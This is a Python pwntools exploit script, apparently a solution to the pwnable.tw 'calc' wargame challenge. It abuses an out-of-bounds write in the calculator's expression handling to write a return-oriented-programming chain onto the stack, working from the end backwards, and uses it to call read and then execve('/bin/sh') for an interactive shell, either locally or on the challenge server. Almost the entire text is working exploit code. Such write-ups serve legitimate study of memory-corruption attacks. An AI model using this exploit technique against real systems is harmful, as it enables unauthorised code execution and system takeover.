#!/usr/bin/env python3

from pwn import *

DWORD = 4
SYS_execve = 0xb
elf = ELF("./given/calc")

def conn():
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10100)
    else:
        p = process([elf.path])
        if args.D:
            gdb.attach(p, """b *calc + 186""")
    return p

def arbit_write(offset, value, p):
    """
    Perform arbitrary write from the offset of the calculator stack/pool.
    Some rules are denoted below:
    1) We can only perform arbitrary write for the positive value.
    2) It will have side effect to make the data[offset-1] += value.
    Therefore, arbitrary writing an entire rop-chain should be performed from the end.
    """
    if value == 0 or value >= 0x80000000:
        print("currently cannot handle this value")
        quit()
    s = "+{}+{}".format(str(offset), str(value))
    print(s)
    rop_chain = s.encode('ascii')
    p.sendline(rop_chain)

def quit_calculator(p):
    p.sendline()

def exploit():
    p = conn()
    p.recvuntil(b"=== Welcome to SECPROG calculator ===")


    # info: pwndeg
    ## func: calc
    offset_pool_struct_2_ebp = 0x5a0
    offset_pool_data_2_ret = offset_pool_struct_2_ebp - DWORD + DWORD
    data_writable = 0x80eb000

    # info: objdump
    func_read = 0x806e6d0
    func_expr = 0x8048e44
    call_read = 0x8048e69
    syscall = 0x807087f
    rop_eax = 0x805c34b
    rop_edx = 0x80701aa
    rop_ecx_ebx = 0x80701d1
    rop_edx_ecx_ebx = 0x80701d0
    rop_3 = rop_edx_ecx_ebx

    # We'will arbit write from return address, i.e. no padding
    rop_chain = p32(func_read)
    rop_chain += p32(rop_3)
    rop_chain += p32(0) + p32(data_writable) + p32(len("/bin/sh\x00"))
    rop_chain += p32(rop_ecx_ebx)
    rop_chain += p32(0) + p32(data_writable)
    rop_chain += p32(rop_edx) + p32(0)
    rop_chain += p32(rop_eax) + p32(SYS_execve)
    rop_chain += p32(syscall)

    # We have to write from the back because
    offset = (offset_pool_data_2_ret + (len(rop_chain)- 4)) // 4
    payloads = [rop_chain[i:i+4] for i in range(0, len(rop_chain), 4)][::-1]
    print([hex(u32(addr)) for addr in payloads[::-1]])
    for i, payload in enumerate(payloads):
        p.recvline()
        val = u32(payload)
        if val == 0:
            pass
        elif i < len(payloads)-1 and payloads[i+1] == p32(0):
            arbit_write(offset-1, 0x7fffffff, p)
            arbit_write(offset, 2, p)
            arbit_write(offset, 0x7fffffff-val, p)
            arbit_write(offset, val, p)
        else:
            arbit_write(offset, val, p)
        offset -= 1
    quit_calculator(p)
    p.sendline(b"/bin/sh\x00")

    p.interactive()


if __name__ == "__main__":
    exploit()
